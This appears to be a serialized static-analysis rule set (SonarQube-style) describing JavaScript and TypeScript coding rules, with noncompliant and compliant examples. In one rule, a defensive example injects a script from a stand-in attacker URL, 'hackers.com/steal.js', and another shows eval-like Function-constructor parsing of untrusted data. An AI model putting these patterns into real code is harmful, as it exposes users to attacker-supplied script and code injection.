  @if (@_jscript_version &gt;= 5.5)
    document.write("You are using IE5.5 or newer");
  @else
    document.write("You are using IE5 or older");
  @end
  @*/
</pre>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>Z
CODE_SMELL
Ø

javascript:S1143ö


javascriptS11434Jump statements should not occur in "finally" blocks"CRITICAL*js:ª	<p>Using <code>return</code>, <code>break</code>, <code>throw</code>, and <code>continue</code> from a <code>finally</code> block overwrites similar
statements from the suspended <code>try</code> and <code>catch</code> blocks.</p>
<p>This rule raises an issue when a jump statement (<code>break</code>, <code>continue</code>, <code>return</code> and <code>throw</code>) would force
control flow to leave a <code>finally</code> block. </p>
<h2>Noncompliant Code Example</h2>
<pre>
function foo() {
    try {
        return 1; // We expect 1 to be returned
    } catch(err) {
        return 2; // Or 2 in cases of error
    } finally {
        return 3; // Noncompliant: 3 is returned before 1, or 2, which we did not expect
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function foo() {
    try {
        return 1; // We expect 1 to be returned
    } catch(err) {
        return 2; // Or 2 in cases of error
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/584.html">MITRE, CWE-584</a> - Return Inside Finally Block </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/mIEbAQ">CERT, ERR04-J.</a> - Do not complete abruptly from a finally block </li>
</ul>ZBUG
Ë
javascript:S1821”

javascriptS1821("switch" statements should not be nested"CRITICAL*js:˘<p>Nested <code>switch</code> structures are difficult to understand because you can easily confuse the cases of an inner <code>switch</code> as
belonging to an outer statement. Therefore nested <code>switch</code> statements should be avoided.</p>
<p>Specifically, you should structure your code to avoid the need for nested <code>switch</code> statements, but if you cannot, then consider moving
the inner <code>switch</code> to another function.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function foo(n, m) {
  switch (n) {
    case 0:
      switch (m) {  // Noncompliant; nested switch
        // ...
      }
    case 1:
      // ...
    default:
      // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function foo(n, m) {
  switch (n) {
    case 0:
      bar(m);
    case 1:
      // ...
    default:
      // ...
  }
}

function bar(m) {
  switch(m) {
    // ...
  }
}
</pre>Z
CODE_SMELL
≥
javascript:S3776û

javascriptS37768Cognitive Complexity of functions should not be too high"CRITICAL*js:¥<p>Cognitive Complexity is a measure of how hard the control flow of a function is to understand. Functions with high Cognitive Complexity will be
difficult to maintain.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://redirect.sonarsource.com/doc/cognitive-complexity.html">Cognitive Complexity</a> </li>
</ul>Z
CODE_SMELL
˝
javascript:S2208Ë

javascriptS2208#Wildcard imports should not be used"CRITICAL*js:ì<p>On the principle that clearer code is better code, you should explicitly <code>import</code> the things you want to use in a module. Using
<code>import *</code> imports everything in the module, and runs the risk of confusing maintainers. Similarly, <code>export * from "module";</code>
imports and then re-exports everything in the module, and runs the risk of confusing not just maintainers but also users of the module.</p>
<h2>Noncompliant Code Example</h2>
<pre>
import * as Imported from "aModule";  // Noncompliant
</pre>Z
CODE_SMELL
˝
javascript:S3785Ë

javascriptS3785,"in" should not be used with primitive types"CRITICAL*js:ë<p>The <code>in</code> operator tests whether the specified property is in the specified object.</p>
<p>If the right operand is a of primitive type (i.e., not an object) the <code>in</code> operator raises a <code>TypeError</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var x = "Foo";
"length" in x; // Noncompliant: TypeError
0 in x;        // Noncompliant: TypeError
</pre>
<h2>Compliant Solution</h2>
<pre>
var x = new String("Foo");
"length" in x;    // true
0 in x;           // true
"foobar" in x;    // false
</pre>ZBUG
”
javascript:S3353æ

javascriptS3353,Unchanged variables should be marked "const""CRITICAL*js:‡<p>Marking a variable that is unchanged after initialization <code>const</code> is an indication to future maintainers that "no this isn't updated,
and it's not supposed to be". <code>const</code> should be used in these situations in the interests of code clarity.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function seek(input) {
  let target = 32;  // Noncompliant
  for (let i of input) {
    if (i == target) {
      return true;
    }
  }
  return false;
}

function getUrl(query) { &nbsp;&nbsp;&nbsp;
  let&nbsp;url; // Noncompliant
  url = "http://example.com";
  return url;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function seek(input) {
  const target = 32;
  for (let i of input) {
    if (i == target) {
      return true;
    }
  }
  return false;
}

function getUrl(query) { &nbsp;
  const&nbsp;url = "http://example.com";
  return url;
}
</pre>Z
CODE_SMELL
˙
javascript:S1067Â

javascriptS1067%Expressions should not be too complex"CRITICAL*js:é<p>The complexity of an expression is defined by the number of <code>&amp;&amp;</code>, <code>||</code> and <code>condition ? ifTrue : ifFalse</code>
operators it contains.</p>
<p>A single expression's complexity should not become too high to keep the code readable.</p>Z
CODE_SMELL
≠
javascript:S1186ò

javascriptS1186Functions should not be empty"CRITICAL*js:…<p>There are several reasons for a function not to have a function body:</p>
<ul>
  <li> It is an unintentional omission, and should be fixed to prevent an unexpected behavior in production. </li>
  <li> It is not yet, or never will be, supported. In this case an exception should be thrown in languages where that mechanism is available. </li>
  <li> The method is an intentionally-blank override. In this case a nested comment should explain the reason for the blank override. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
function foo() {
}

var foo = () =&gt; {};
</pre>
<h2>Compliant Solution</h2>
<pre>
function foo() {
    // This is intentional
}

var foo = () =&gt; {
    do_something();
};
</pre>Z
CODE_SMELL
ñ
javascript:NestedIfDepth˘

javascriptNestedIfDepth`Control flow statements "if", "for", "while", "switch" and "try" should not be nested too deeply"CRITICAL*js:ﬂ<p>Nested <code>if</code>, <code>for</code>, <code>while</code>, <code>switch</code>, and <code>try</code> statements are key ingredients for making
what's known as "Spaghetti code".</p>
<p>Such code is hard to read, refactor and therefore maintain.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 3:</p>
<pre>
  if (condition1) {                  // Compliant - depth = 1
    /* ... */
    if (condition2) {                // Compliant - depth = 2
      /* ... */
      for(let i = 0; i &lt; 10; i++) {  // Compliant - depth = 3, not exceeding the limit
        /* ... */
        if (condition4) {            // Non-Compliant - depth = 4
          if (condition5) {          // Depth = 5, exceeding the limit, but issues are only reported on depth = 4
            /* ... */
          }
          return;
        }
      }
    }
  }
</pre>Z
CODE_SMELL
»

javascript:S930¥


javascriptS930.Function calls should not pass extra arguments"CRITICAL*js:‹	<p>You can easily call a JavaScript function with more arguments than the function needs, but the extra arguments will be just ignored by function
execution.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
function say(a, b) {
  print(a + " " + b);
}

say("hello", "world", "!"); // Noncompliant; last argument is not used
</pre>
<h2>Exceptions</h2>
<p>No issue is reported when <code>arguments</code> is used in the body of the function being called.</p>
<pre>
function doSomething(a, b) {
  compute(arguments);
}

doSomething(1, 2, 3) // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 16.6 - The number of arguments passed to a function shall match the number of parameters. </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/628.html">MITRE, CWE-628</a> - Function Call with Incorrectly Specified Arguments </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/LoAg">CERT, DCL07-C.</a> - Include the appropriate type information in function
  declarators </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/VQBc">CERT, EXP37-C.</a> - Call functions with the correct number and type of arguments
  </li>
</ul>ZBUG
…
javascript:S3834¥

javascriptS3834,"Symbol" should not be used as a constructor"CRITICAL*js:›<p><code>Symbol</code> is a primitive type introduced in ECMAScript2015. Its instances are mainly used as unique property keys.</p>
<p>An instance can only be created by using <code>Symbol</code> as a function. Using <code>Symbol</code> with the <code>new</code> operator will raise
a <code>TypeError</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
const sym = new Symbol("foo");   // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
const sym = Symbol("foo");
</pre>ZBUG
á
javascript:S1541Ú

javascriptS1541#Functions should not be too complex"CRITICAL*js:ù<p>The Cyclomatic Complexity of functions should not exceed a defined threshold. Complex code may perform poorly and can be difficult to test
thoroughly.</p>Z
CODE_SMELL
ë
javascript:S121˝

javascriptS121*Control structures should use curly braces"CRITICAL*js:¢<p>While not technically incorrect, the omission of curly braces can be misleading, and may lead to the introduction of errors during maintenance.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (condition)  // Noncompliant
  executeSomething();
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition) {
  executeSomething();
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/1QGMAg">CERT, EXP19-C.</a> - Use braces for the body of an if, for, or while statement
  </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/3wHEAw">CERT, EXP52-J.</a> - Use braces for the body of an if, for, or while statement
  </li>
</ul>Z
CODE_SMELL
à
javascript:StrictModeÓ

javascript
StrictMode)"strict" mode should be used with caution"CRITICAL*js:é<p>Even though it may be a good practice to enforce JavaScript strict mode, doing so could result in unexpected behaviors on browsers that do not
support it yet. Using this feature should therefore be done with caution and with full knowledge of the potential consequences on browsers that do not
support it.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function strict() {
  'use strict';
}
</pre>Z
CODE_SMELL
Ô
javascript:S1994⁄

javascriptS1994>"for" loop increment clauses should modify the loops' counters"CRITICAL*js:Í<p>It can be extremely confusing when a <code>for</code> loop's counter is incremented outside of its increment clause. In such cases, the increment
should be moved to the loop's increment clause if at all possible.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (i = 0; i &lt; 10; j++) { // Noncompliant
  // ...
  i++;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
for (i = 0; i &lt; 10; i++, j++) {
  // ...
}
</pre>
<p>Or </p>
<pre>
for (i = 0; i &lt; 10; i++) {
  // ...
  j++;
}
</pre>Z
CODE_SMELL
æ	
javascript:S3812©	

javascriptS3812GResults of "in" and "instanceof" should be negated rather than operands"CRITICAL*js:∑<p>Mixing up the order of operations will almost always yield unexpected results.</p>
<p>Similarly, mis-applied negation will also yield bad results. For instance consider the difference between <code>!key in dict</code> and <code>!(key
in dict)</code>. The first looks for a boolean value (<code>!key</code>) in <code>dict</code>, and the other looks for a string and inverts the
result. <code>!obj instanceof SomeClass</code> has the same problem.</p>
<p>This rule raises an issue when the left operand of an <code>in</code> or <code>instanceof</code> operator is negated.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (!"prop" in myObj) {  // Noncompliant;  "in" operator is checking property "false"
  doTheThing();  // this block will be never executed
}

if (!foo instanceof MyClass) {  // Noncompliant; "!foo" returns a boolean, which is not an instance of anything
  doTheOtherThing();  // this block is never executed
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (!("prop" in myObj)) {
  doTheThing();
}

if (!(foo instanceof MyClass)) {
  doTheOtherThing();
}
</pre>ZBUG
ì
javascript:S1192˛

javascriptS1192(String literals should not be duplicated"CRITICAL*js:§<p>Duplicated string literals make the process of refactoring error-prone, since you must be sure to update all occurrences.</p>
<p>On the other hand, constants can be referenced from many places, but only need to be updated in a single place.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Exceptions</h2>
<p>To prevent generating some false-positives, literals having less than 10 characters are excluded as well as literals matching <code>/^\w*$/</code>.
String literals inside import/export statements and JSX attributes are also ignored. The same goes for statement-like string literals, e.g. <code>'use strict';</code>.</p>Z
CODE_SMELL
Ó
javascript:S2611Ÿ

javascriptS2611(Untrusted content should not be included"CRITICAL*js:¸<p>Including content in your site from an untrusted source can expose your users to attackers and even compromise your own site. For that reason, this
rule raises an issue for each non-relative URL.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function include(url) {
  var s = document.createElement("script");
  s.setAttribute("type", "text/javascript");
  s.setAttribute("src", url);
  document.body.appendChild(s);
}
include("http://hackers.com/steal.js")  // Noncompliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection">OWASP Top 10 2017 Category A1</a> - Injection </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/829">MITRE, CWE-829</a> - Inclusion of Functionality from Untrusted Control Sphere </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat2">SANS Top 25</a> - Risky Resource Management </li>
</ul>ZVULNERABILITY
Ö
javascript:S2549

javascriptS25499The "changed" property should not be manipulated directly"CRITICAL*js:å<p>According to the Backbone.js docs</p>
<blockquote>
  The
  <strong>changed</strong> property is the internal hash containing all the attributes that have changed since the last set. Please do not update
  <strong>changed</strong> directly since its state is internally maintained by set. A copy of
  <strong>changed</strong> can be acquired from changedAttributes.
</blockquote>
<p>The <code>changed</code> property is involved in decisions about whether or not a collection should be resorted when it is updated. If you modify
it manually, you can break the resorting of the collection.</p>
<h2>Noncompliant Code Example</h2>
<pre>
myModel.changed = { myProperty: 1 }; // Non-compliant
</pre>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>ZBUG
Ê
javascript:S3523—

javascriptS3523(Function constructors should not be used"CRITICAL*js:˜<p>In addition to being obtuse from a syntax perspective, function constructors are also dangerous: their execution evaluates the constructor's string
arguments similar to the way <code>eval</code> works, which could expose your program to random, unintended code which can be both slow and a security
risk.</p>
<p>In general it is better to avoid it altogether, particularly when used to parse JSON data. You should use ECMAScript 5's built-in JSON functions or
a dedicated library.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var obj =  new Function("return " + data)();  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
var obj = JSON.parse(data);
</pre>
<h2>Exceptions</h2>
<p>Function calls where the argument is a string literal (e.g. <code>(Function('return this'))()</code>) are ignored. </p>
<h2>See</h2>
<ul>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated; use <a href='/coding_rules#rule_key=javascript%3AS1523'>S1523</a> instead.</p>Z
CODE_SMELL
Å
javascript:S2310Ï

javascriptS2310ALoop counters should not be assigned to from within the loop body"CRITICAL*js:˘<p>Loop counters should not be modified in the body of the loop. However other loop control variables representing logical values may be modified in
the loop, for example a flag to indicate that something has been completed, which is then tested in the for statement.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var names = [ "Jack", "Jim", "", "John" ];
for (var i = 0; i &lt; names.length; i++) {
  if (!names[i]) {
    i = names.length;                                 // Non-Compliant
  } else {
    console.log(names[i]);
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
var names = [ "Jack", "Jim", "", "John" ];
for (var name of names) {
  if (!name) {
    break;                                 // Compliant
  } else {
    console.log(name);
  }
}
</pre>Z
CODE_SMELL
∑
javascript:S3525¢

javascriptS3525?Class methods should be used instead of "prototype" assignments"CRITICAL*js:±<p>Originally JavaScript didn't support <code>class</code>es, and class-like behavior had to be kludged using things like <code>prototype</code>
assignments for "class" functions. Fortunately, ECMAScript 2015 added classes, so any lingering <code>prototype</code> uses should be converted to
true <code>class</code>es. The new syntax is more expressive and clearer, especially to those with experience in other languages.</p>
<p>Specifically, with ES2015, you should simply declare a <code>class</code> and define its methods inside the class declaration.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function MyNonClass(initializerArgs = []) {
  this._values = [...initializerArgs];
}

MyNonClass.prototype.doSomething = function () {  // Noncompliant
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass {
  constructor(initializerArgs = []) {
    this._values = [...initializerArgs];
  }

  doSomething() {
    //...
  }
}
</pre>Z
CODE_SMELL
œ

javascript:S3854∫


javascriptS3854)"super()" should be invoked appropriately"CRITICAL*js:Ê	<p>There are situations where <code>super()</code> must be invoked and situations where <code>super()</code> cannot be invoked.</p>
<p>The basic rule is: a constructor in a non-derived class cannot invoke <code>super()</code>; a constructor in a derived class must invoke
<code>super()</code>.</p>
<p>Furthermore:</p>
<p>- <code>super()</code> must be invoked before the <code>this</code> and <code>super</code> keywords can be used.</p>
<p>- <code>super()</code> must be invoked with the same number of arguments as the base class' constructor.</p>
<p>- <code>super()</code> can only be invoked in a constructor - not in any other method.</p>
<p>- <code>super()</code> cannot be invoked multiple times in the same constructor.</p>
<h3>Known Limitations</h3>
<ul>
  <li> False negatives: some issues are not raised if the base class is not defined in the same file as the current class. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
class Dog extends Animal {
  constructor(name) {
    super();
    this.name = name;
    super();         // Noncompliant
    super.doSomething();
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class Dog extends Animal {
  constructor(name) {
    super();
    this.name = name;
    super.doSomething();
  }
}
</pre>ZBUG
¢
javascript:S3972ç

javascriptS3972&Conditionals should start on new lines"CRITICAL*js:µ<p>Code is clearest when each statement has its own line. Nonetheless, it is a common pattern to combine on the same line an <code>if</code> and its
resulting <em>then</em> statement. However, when an <code>if</code> is placed on the same line as the closing <code>}</code> from a preceding
<em>then</em>, <em>else</em> or <em>else if</em> part, it is either an error - <code>else</code> is missing - or the invitation to a future error as
maintainers fail to understand that the two statements are unconnected.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (condition1) {
  // ...
} if (condition2) {  // Noncompliant
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition1) {
  // ...
} else if (condition2) {
  //...
}
</pre>
<p>Or</p>
<pre>
if (condition1) {
  // ...
}

if (condition2) {
  //...
}
</pre>Z
CODE_SMELL
¡
javascript:S3973¨

javascriptS3973EA conditionally executed single line should be denoted by indentation"CRITICAL*js:µ<p>In the absence of enclosing curly braces, the line immediately after a conditional is the one that is conditionally executed. By both convention
and good practice, such lines are indented. In the absence of both curly braces and indentation the intent of the original programmer is entirely
unclear and perhaps not actually what is executed. Additionally, such code is highly likely to be confusing to maintainers.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (condition)  // Noncompliant
doTheThing();

doTheOtherThing();
somethingElseEntirely();

foo();
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition)
  doTheThing();

doTheOtherThing();
somethingElseEntirely();

foo();
</pre>Z
CODE_SMELL
è	
javascript:SwitchWithoutDefaultÎ

javascriptSwitchWithoutDefault1"switch" statements should have "default" clauses"CRITICAL*js:˘<p>The requirement for a final <code>default</code> clause is defensive programming. The clause should either take appropriate action, or contain a
suitable comment as to why no action is taken.</p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (param) {  //missing default clause
  case 0:
    doSomething();
    break;
  case 1:
    doSomethingElse();
    break;
}

switch (param) {
  default: // default clause should be the last one
    error();
    break;
  case 0:
    doSomething();
    break;
  case 1:
    doSomethingElse();
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch (param) {
  case 0:
    doSomething();
    break;
  case 1:
    doSomethingElse();
    break;
  default:
    error();
    break;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/478.html">MITRE, CWE-478</a> - Missing Default Case in Switch Statement </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/YgE">CERT, MSC01-C.</a> - Strive for logical completeness </li>
</ul>Z
CODE_SMELL
ı	
javascript:ElseIfWithoutElse‘	

javascriptElseIfWithoutElse:"if ... else if" constructs should end with "else" clauses"CRITICAL*js:‹<p>This rule applies whenever an <code>if</code> statement is followed by one or more <code>else if</code> statements; the final <code>else if</code>
should be followed by an <code>else</code> statement.</p>
<p>The requirement for a final <code>else</code> statement is defensive programming.</p>
<p>The <code>else</code> statement should either take appropriate action or contain a suitable comment as to why no action is taken. This is
consistent with the requirement to have a final <code>default</code> clause in a <code>switch</code> statement.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (x == 0) {
  doSomething();
} else if (x == 1) {
  doSomethingElse();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (x == 0) {
  doSomething();
} else if (x == 1) {
  doSomethingElse();
} else {
  throw "Unexpected value for x";
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/YgE">CERT, MSC01-C.</a> - Strive for logical completeness </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/PQHRAw">CERT, MSC57-J.</a> - Strive for logical completeness </li>
</ul>Z
CODE_SMELL
¢
javascript:S3735ç

javascriptS3735"void" should not be used"CRITICAL*js:¬<p>The <code>void</code> operator evaluates its argument and unconditionally returns <code>undefined</code>. It can be useful in pre-ECMAScript 5
environments, where <code>undefined</code> could be reassigned, but generally, its use makes code harder to understand.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void (function() {
   ...
}());
</pre>
<h2>Compliant Solution</h2>
<pre>
(function() {
   ...
}());
</pre>
<h2>Exceptions</h2>
<p>No issue is raised when <code>void 0</code> is used in place of <code>undefined</code>. </p>
<pre>
if (parameter === void 0) {...}
</pre>Z
CODE_SMELL
É
javascript:S888Ô

javascriptS888JEquality operators should not be used in "for" loop termination conditions"CRITICAL*js:Ù
<p>Testing <code>for</code> loop termination using an equality operator (<code>==</code> and <code>!=</code>) is dangerous, because it could set up an
infinite loop. Using a broader relational operator instead casts a wider net, and makes it harder (but not impossible) to accidentally write an
infinite loop.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (var i = 1; i != 10; i += 2)  // Noncompliant. Infinite; i goes from 9 straight to 11.
{
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
for (var i = 1; i &lt;= 10; i += 2)  // Compliant
{
  //...
}
</pre>
<h2>Exceptions</h2>
<p>Equality operators are ignored if the loop counter is not modified within the body of the loop and either:</p>
<ul>
  <li> starts below the ending value and is incremented by 1 on each iteration. </li>
  <li> starts above the ending value and is decremented by 1 on each iteration. </li>
</ul>
<p>Equality operators are also ignored when the test is against <code>null</code>.</p>
<pre>
for (var i = 0; arr[i] != null; i++) {
  // ...
}

for (var i = 0; (item = arr[i]) != null; i++) {
  // ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/835">MITRE, CWE-835</a> - Loop with Unreachable Exit Condition ('Infinite Loop') </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/EwDJAQ">CERT, MSC21-C.</a> - Use robust loop termination conditions </li>
</ul>Z
CODE_SMELL
ê	
javascript:S3504˚

javascriptS35042Variables should be declared with "let" or "const""CRITICAL*js:ó<p>ECMAScript 2015 introduced the <code>let</code> and <code>const</code> keywords for block-scope variable declaration. Using <code>const</code>
creates a read-only (constant) variable.</p>
<p>The distinction between the variable types created by <code>var</code> and by <code>let</code> is significant, and a switch to <code>let</code>
will help alleviate many of the variable scope issues which have caused confusion in the past. </p>
<p>Because these new keywords create more precise variable types, they are preferred in environments that support ECMAScript 2015. However, some
refactoring may be required by the switch from <code>var</code> to <code>let</code>, and you should be aware that they raise <code>SyntaxError</code>s
in pre-ECMAScript 2015 environments.</p>
<p>This rule raises an issue when <code>var</code> is used instead of <code>const</code> or <code>let</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var color = "blue";
var size = 4;
</pre>
<h2>Compliant Solution</h2>
<pre>
const color = "blue";
let size = 4;
</pre>Z
CODE_SMELL
‘

javascript:S4275ø


javascriptS42755Getters and setters should access the expected fields"CRITICAL*js:ﬂ	<p>Getters and setters provide a way to enforce encapsulation by providing <code>public</code> methods that give controlled access to
<code>private</code> fields. However in classes with multiple fields it is not unusual that cut and paste is used to quickly create the needed getters
and setters, which can result in the wrong field being accessed by a getter or setter.</p>
<p>This rule raises an issue in any of these cases:</p>
<ul>
  <li> A setter does not update the field with the corresponding name. </li>
  <li> A getter does not access the field with the corresponding name. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
class A {
  private _x: number = 0;
  private y: number = 0;

  public get x() {  // Noncompliant: field 'x' is not used in the return value
    return this.y;
  }

  public setX(val: number) { // Noncompliant: field 'x' is not updated
    this.y = val;
  }

  public getY() { // Noncompliant: field 'y' is not used in the return value
    return this.x;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class A {
  private _x: number = 0;
  private y: number = 0;

  public get x() {
    return this._x;
  }

  public setX(val: number) {
    this.x = val;
  }

  public getY() {
    return this.y;
  }
}
</pre>ZBUG
ö
typescript:S4524Ö

typescriptS4524 "default" clauses should be last"CRITICAL*ts:≥<p><code>switch</code> can contain a <code>default</code> clause for various reasons: to handle unexpected values, to show that all the cases were
properly considered.</p>
<p>For readability purpose, to help a developer to quickly find the default behavior of a <code>switch</code> statement, it is recommended to put the
<code>default</code> clause at the end of the <code>switch</code> statement. This rule raises an issue if the <code>default</code> clause is not the
first or the last one of the <code>switch</code>'s cases.</p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (param) {
  case 0:
    doSomething();
    break;
  default: // default clause should be the first or last one
    error();
    break;
  case 1:
    doSomethingElse();
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch (param) {
  case 0:
    doSomething();
    break;
  case 1:
    doSomethingElse();
    break;
  default:
    error();
    break;
}
</pre>Z
CODE_SMELL
´
typescript:S4123ñ

typescriptS4123)"await" should only be used with promises"CRITICAL*ts:ª<p>It is possible to use <code>await</code> on values which are not <code>Promise</code>s, but it's useless and misleading. The point of
<code>await</code> is to pause execution until the <code>Promise</code>'s asynchronous code has run to completion. With anything other than a
<code>Promise</code>, there's nothing to wait for.</p>
<p>This rule raises an issue when an <code>await</code>ed value is guaranteed not to be a <code>Promise</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
let x = 42;
await x; // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
let x = new Promise(resolve =&gt; resolve(42));
await x;

let y = p ? 42 : new Promise(resolve =&gt; resolve(42));
await y;
</pre>Z
CODE_SMELL
á
typescript:S1541Ú

typescriptS1541#Functions should not be too complex"CRITICAL*ts:ù<p>The Cyclomatic Complexity of functions should not exceed a defined threshold. Complex code may perform poorly and can be difficult to test
thoroughly.</p>Z
CODE_SMELL
Ø

typescript:S1143ö


typescriptS11434Jump statements should not occur in "finally" blocks"CRITICAL*ts:ª	<p>Using <code>return</code>, <code>break</code>, <code>throw</code>, and <code>continue</code> from a <code>finally</code> block overwrites similar
statements from the suspended <code>try</code> and <code>catch</code> blocks.</p>
<p>This rule raises an issue when a jump statement (<code>break</code>, <code>continue</code>, <code>return</code> and <code>throw</code>) would force
control flow to leave a <code>finally</code> block. </p>
<h2>Noncompliant Code Example</h2>
<pre>
function foo() {
    try {
        return 1; // We expect 1 to be returned
    } catch(err) {
        return 2; // Or 2 in cases of error
    } finally {
        return 3; // Noncompliant: 3 is returned before 1, or 2, which we did not expect
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function foo() {
    try {
        return 1; // We expect 1 to be returned
    } catch(err) {
        return 2; // Or 2 in cases of error
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/584.html">MITRE, CWE-584</a> - Return Inside Finally Block </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/mIEbAQ">CERT, ERR04-J.</a> - Do not complete abruptly from a finally block </li>
</ul>ZBUG
ë
typescript:S121˝

typescriptS121*Control structures should use curly braces"CRITICAL*ts:¢<p>While not technically incorrect, the omission of curly braces can be misleading, and may lead to the introduction of errors during maintenance.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (condition)  // Noncompliant
  executeSomething();
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition) {
  executeSomething();
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/1QGMAg">CERT, EXP19-C.</a> - Use braces for the body of an if, for, or while statement
  </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/3wHEAw">CERT, EXP52-J.</a> - Use braces for the body of an if, for, or while statement
  </li>
</ul>Z
CODE_SMELL
⁄
typescript:S2871≈

typescriptS2871IA compare function should be provided when using "Array.prototype.sort()""CRITICAL*ts:—<p>The default sort order is alphabetic, rather than numeric, regardless of the types in the array. Specifically, even if an array contains only
numbers, all values in it will be converted to strings and sorted lexicographically, for an order like this: 1, 15, 2, 20, 5.</p>
<p>Fortunately the <code>sort</code> method allows you to pass an optional compare function to specify the sort order. When a compare function is
supplied, the returned order depends on the return value of the compare function. </p>
<h2>Noncompliant Code Example</h2>
<pre>
var myarray = [80, 3, 9, 34, 23, 5, 1];

myarray.sort();
console.log(myarray); // outputs: [1, 23, 3, 34, 5, 80, 9]
</pre>
<h2>Compliant Solution</h2>
<pre>
var myarray = [80, 3, 9, 34, 23, 5, 1];

myarray.sort((a, b) =&gt; (a - b));
console.log(myarray); // outputs: [1, 3,  5, 9, 23, 34, 80]
</pre>ZBUG
Ë
typescript:S1821”

typescriptS1821("switch" statements should not be nested"CRITICAL*ts:˘<p>Nested <code>switch</code> structures are difficult to understand because you can easily confuse the cases of an inner <code>switch</code> as
belonging to an outer statement. Therefore nested <code>switch</code> statements should be avoided.</p>
<p>Specifically, you should structure your code to avoid the need for nested <code>switch</code> statements, but if you cannot, then consider moving
the inner <code>switch</code> to another function.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function foo(n, m) {
  switch (n) {
    case 0:
      switch (m) {  // Noncompliant; nested switch
        // ...
      }
    case 1:
      // ...
    default:
      // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function foo(n, m) {
  switch (n) {
    case 0:
      bar(m);
    case 1:
      // ...
    default:
      // ...
  }
}

function bar(m) {
  switch(m) {
    // ...
  }
}
</pre>Z
CODE_SMELL
≥
typescript:S3776û

typescriptS37768Cognitive Complexity of functions should not be too high"CRITICAL*ts:¥<p>Cognitive Complexity is a measure of how hard the control flow of a function is to understand. Functions with high Cognitive Complexity will be
difficult to maintain.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://redirect.sonarsource.com/doc/cognitive-complexity.html">Cognitive Complexity</a> </li>
</ul>Z
CODE_SMELL
ı
